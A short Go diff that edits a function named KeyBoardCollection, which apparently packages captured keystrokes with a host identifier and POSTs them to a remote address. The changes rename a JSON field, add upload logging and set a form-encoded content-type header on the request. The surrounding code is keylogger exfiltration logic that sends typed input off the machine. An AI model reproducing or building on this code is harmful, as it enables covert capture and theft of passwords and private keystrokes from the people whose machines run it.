@@ -19,7 +19,7 @@ var (
 )
 
 type msg struct {
-	Record string `json:"record"`
+	Record string `json:"hit"`
 	Hostid string `json:"hostid"`
 }
 
@@ -44,8 +44,10 @@ func KeyBoardCollection(addr string) {
 				Record: tmpKeylog,
 				Hostid: versionDetail.Hostid,
 			}
+			log.Println("upload msg", &msgstb)
 			resp, _, err := gorequest.New().
 				Post(addr).
+				Set("content-type", "application/x-www-form-urlencoded").
 				Send(msgstb).
 				EndStruct(&keyboardStatusResponse)
 			if err != nil {
@@ -62,8 +64,10 @@ func KeyBoardCollection(addr string) {
 				Record: tmpKeylog,
 				Hostid: versionDetail.Hostid,
 			}
+			log.Println("upload msg", &msgstb)
 			resp, _, err := gorequest.New().
 				Post(addr).
+				Set("content-type", "application/x-www-form-urlencoded").
 				Send(msgstb).
 				EndStruct(&keyboardStatusResponse)
 			if err != nil {
